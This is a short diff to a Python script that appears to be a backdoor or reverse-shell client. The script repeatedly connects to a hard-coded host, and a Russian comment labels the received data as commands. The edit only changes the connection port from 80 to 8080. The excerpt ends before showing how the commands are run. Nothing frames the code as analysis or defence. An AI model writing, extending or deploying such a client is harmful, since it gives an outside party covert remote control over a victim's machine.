@@ -5,7 +5,7 @@ host = "192.168.1.47"
 while True:
     try:
         sock = socket.socket()
-        sock.connect((host, 80))
+        sock.connect((host, 8080))
         while True:
             try:
                 data = sock.recv(1024).decode()  # получаем команду
